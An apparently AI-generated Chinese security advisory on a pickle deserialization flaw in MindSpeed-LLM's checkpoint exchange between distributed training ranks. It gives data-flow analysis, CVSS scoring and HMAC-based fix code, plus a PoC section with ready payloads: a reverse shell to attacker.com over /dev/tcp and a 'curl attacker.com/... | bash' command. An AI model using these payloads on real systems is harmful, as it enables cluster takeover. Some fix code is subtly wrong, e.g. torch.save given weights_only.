# VULN-014：分布式训练节点间Checkpoint传输存在Pickle RCE横向移动风险

## 漏洞基本信息

| 字段 | 值 |
|------|-----|
| **漏洞ID** | VULN-014 |
| **CWE** | CWE-502 (Deserialization of Untrusted Data) |
| **严重性** | Critical |
| **置信度** | 85/100 |
| **位置** | `mindspeed_llm/core/high_availability/tft_optimizer_data_repair.py:204-205` |
| **函数** | `recv_ckpt_from_peer` |
| **模块** | mindspeed_llm/core/high_availability |
| **特征** | **跨模块攻击 + 分布式横向移动** |

---

## ⚠️ 最危险漏洞警告

此漏洞是 MindSpeed-LLM 项目中**最危险的漏洞**，原因：

1. **攻击来源**: 数据来自分布式训练的其他 rank，而非本地文件
2. **横向移动**: 攻陷单个节点 → 可攻陷整个 GPU 集群
3. **信任假设缺陷**: 代码假设所有 rank 都是可信的，但实际中任何 rank 被攻陷都可威胁整个集群

---

## 漏洞原理详解

### 分布式训练架构

在多节点 GPU 训练中，各节点(rank) 通过 `torch.distributed` 进行通信。当某个节点故障恢复时，会从其他节点接收 checkpoint 数据。

**攻击原理**: 如果攻击者攻陷任何一个 rank，可以：
1. 修改该 rank 发送的 checkpoint 数据
2. 在 checkpoint 中嵌入恶意 pickle payload
3. 其他 rank 接收并 `torch.load()` → 全集群被攻陷

---

## 漏洞代码

```python
# mindspeed_llm/core/high_availability/tft_optimizer_data_repair.py:180-205

def recv_ckpt_from_peer(src_rank, dest_rank):
    """接收来自其他 rank 的 checkpoint 数据"""
    
    # 接收 checkpoint 数据 tensor
    state_dict_tensor = torch.empty(...)
    torch.distributed.recv(state_dict_tensor, src_rank)  # 从网络接收
    
    # 转换为 bytes
    state_dict_bytes = state_dict_tensor.to('cpu').numpy().tobytes()
    buffer = io.BytesIO(state_dict_bytes)
    
    # 危险！直接反序列化网络数据，无任何验证
    loaded_state_dict = torch.load(
        buffer, 
        map_location=map_location, 
        weights_only=False  # 明确允许 pickle RCE
    )
    
    set_memory_ckpt(loaded_state_dict)
```

---

## 数据流分析

```
Source: 分布式网络传输
  ↓
torch.distributed.recv(state_dict_tensor, src_rank)
  ↓ [数据来自其他 GPU rank]
state_dict_tensor.to('cpu').numpy()
  ↓
state_dict_bytes.tobytes()
  ↓
io.BytesIO(state_dict_bytes) → buffer
  ↓
torch.load(buffer, weights_only=False)
  ↓ [SINK - 完全无验证的反序列化]
恶意 pickle payload 执行 → 全集群 RCE
```

**关键问题**:
- 无发送方身份验证
- 无数据完整性校验 (无 HMAC/signature)
- 无数据来源审计
- `weights_only=False` 明确允许任意代码执行

---

## 攻击载荷构造 (PoC)

### 场景: 攻陷 Rank 0 → 攻陷全集群

```python
# 在被攻陷的 Rank 0 上执行
import torch
import io
import socket
import subprocess

class ClusterRCE:
    def __reduce__(self):
        # 在所有接收节点执行反向 shell
        return (subprocess.Popen, (
            ['bash', '-c', 
             'bash -i >& /dev/tcp/attacker.com/4444 0>&1'],
            -1, -1, -1
        ))

# 构造恶意 checkpoint
malicious_ckpt = {
    'optimizer_state': ClusterRCE(),
    'iteration': 1000
}

# 序列化
buffer = io.BytesIO()
torch.save(malicious_ckpt, buffer)
malicious_bytes = buffer.getvalue()

# 修改 recv_ckpt_from_peer 的响应
# 发送恶意数据给其他 rank
state_dict_tensor = torch.from_numpy(
    np.frombuffer(malicious_bytes, dtype=np.uint8)
).to('npu')
torch.distributed.send(state_dict_tensor, dst_rank)  # 发送给目标 rank

# 其他 rank 执行 recv_ckpt_from_peer() → torch.load() → RCE
```

### Payload: 全集群命令执行

```python
class ClusterCommand:
    def __reduce__(self):
        return (os.system, (
            'curl attacker.com/cluster_exploit.sh | bash && '
            'echo "RANK_$RANK compromised" >> /tmp/pwned.txt'
        ))
```

---

## 攻击场景描述

### 场景: 分布式训练横向移动

```
┌─────────────────────────────────────────────────────────────────┐
│                     分布式 GPU 训练集群                           │
│  ┌─────────┐    ┌─────────┐    ┌─────────┐    ┌─────────┐       │
│  │ Rank 0  │    │ Rank 1  │    │ Rank 2  │    │ Rank 3  │       │
│  │ (攻陷)  │───▶│ (目标)  │───▶│ (目标)  │───▶│ (目标)  │       │
│  └─────────┘    └─────────┘    └─────────┘    └─────────┘       │
│       │              ▲              ▲              ▲            │
│       │              │              │              │            │
│       └──────────────┴──────────────┴──────────────┘            │
│                  发送恶意 checkpoint payload                      │
│                                                                  │
│  结果: 全集群被控制 (4个 GPU节点 → attacker获得root)              │
└─────────────────────────────────────────────────────────────────┘
```

**攻击步骤**:

1. **初始入侵**: 攻击者通过其他漏洞（如 web 服务、SSH）攻陷 Rank 0
2. **修改代码**: 在 Rank 0 上修改 `recv_ckpt_from_peer` 的发送逻辑
3. **注入 payload**: 在发送的 checkpoint 中嵌入恶意 pickle
4. **触发恢复**: 触发其他 rank 的故障恢复机制
5. **横向移动**: 其他 rank 调用 `torch.load()` → 执行恶意代码
6. **集群控制**: 攻击者获得所有 GPU 节点的控制权

---

## 利用条件

| 条件 | 是否满足 |
|------|----------|
| 分布式训练环境 | ✓ (高可用模块设计目的) |
| Rank 间 checkpoint 传输 | ✓ (核心功能) |
| 无发送方验证 | ✓ (信任所有 rank) |
| weights_only=False | ✓ (明确设置) |
| 无数据完整性校验 | ✓ (无 HMAC/hash) |

**利用难度**: 中等 (需要先攻陷一个 rank，但横向移动极容易)

---

## 影响范围

- **单节点攻陷 → 全集群沦陷**
- 攻击者可获得:
  - 所有训练数据
  - 所有模型权重
  - 所有 GPU 资源
  - 集群网络内其他服务

---

## 修复建议

### 立即修复 (Critical)

```python
import hashlib
import hmac
import io

# 预共享密钥 (安全配置)
CLUSTER_SHARED_SECRET = os.environ.get('CLUSTER_HMAC_KEY')

def recv_ckpt_from_peer_secure(src_rank, dest_rank, expected_hash=None):
    """安全的分布式 checkpoint 接收"""
    
    # 1. 接收 checkpoint 数据
    state_dict_tensor = torch.empty(...)
    torch.distributed.recv(state_dict_tensor, src_rank)
    
    # 2. 接收元数据 (hash + HMAC)
    meta_tensor = torch.empty(64, dtype=torch.uint8)
    torch.distributed.recv(meta_tensor, src_rank)
    meta_bytes = meta_tensor.to('cpu').numpy().tobytes()
    
    received_hash = meta_bytes[:32].hex()
    received_mac = meta_bytes[32:].hex()
    
    # 3. 转换数据
    state_dict_bytes = state_dict_tensor.to('cpu').numpy().tobytes()
    
    # 4. 验证哈希
    actual_hash = hashlib.sha256(state_dict_bytes).hexdigest()
    if actual_hash != received_hash:
        raise SecurityError(
            f"Checkpoint hash mismatch from rank {src_rank}. "
            "POSSIBLE CLUSTER COMPROMISE!"
        )
    
    # 5. 验证 HMAC
    if CLUSTER_SHARED_SECRET:
        expected_mac = hmac.new(
            CLUSTER_SHARED_SECRET.encode(),
            state_dict_bytes,
            hashlib.sha256
        ).hexdigest()
        if expected_mac != received_mac:
            raise SecurityError(
                f"HMAC verification failed from rank {src_rank}. "
                "POSSIBLE TAMPERING!"
            )
    
    # 6. 安全加载
    buffer = io.BytesIO(state_dict_bytes)
    loaded_state_dict = torch.load(
        buffer, 
        map_location=map_location,
        weights_only=True  # 关键修复！
    )
    
    return loaded_state_dict
```

### 发送端修复

```python
def send_ckpt_to_peer_secure(dst_rank, checkpoint):
    """安全的分布式 checkpoint 发送"""
    
    # 1. 安全序列化
    buffer = io.BytesIO()
    torch.save(checkpoint, buffer, weights_only=True)
    data = buffer.getvalue()
    
    # 2. 计算哈希和 HMAC
    data_hash = hashlib.sha256(data).digest()
    data_mac = hmac.new(
        CLUSTER_SHARED_SECRET.encode(),
        data,
        hashlib.sha256
    ).digest()
    
    # 3. 发送元数据 + 数据
    meta = data_hash + data_mac
    meta_tensor = torch.from_numpy(np.frombuffer(meta, dtype=np.uint8))
    torch.distributed.send(meta_tensor, dst_rank)
    
    data_tensor = torch.from_numpy(np.frombuffer(data, dtype=np.uint8))
    torch.distributed.send(data_tensor, dst_rank)
```

---

## CVSS 评分预估

**CVSS 3.1**: **9.3 (Critical)**

| 指标 | 值 |
|------|-----|
| Attack Vector | Network (N) |
| Attack Complexity | Low (L) |
| Privileges Required | Low (L) |
| User Interaction | None (N) |
| Scope | Changed (C) |
| Confidentiality | High (H) |
| Integrity | High (H) |
| Availability | High (H) |

---

## 相关 CVE 参考

- **CVE-2026-26220**: LightLLM WebSocket pickle RCE (CVSS 9.3) - 类似的网络 pickle RCE

---

## 特殊标记

- **跨模块攻击**: ✓ (rank间通信)
- **横向移动**: ✓ (集群渗透)
- **高危优先级**: P0 (最高)

---

**报告生成时间**: 2026-04-20  
**分析者**: Security Scanner Agent  
**警告**: 此漏洞可导致整个训练集群被攻陷，需立即修复！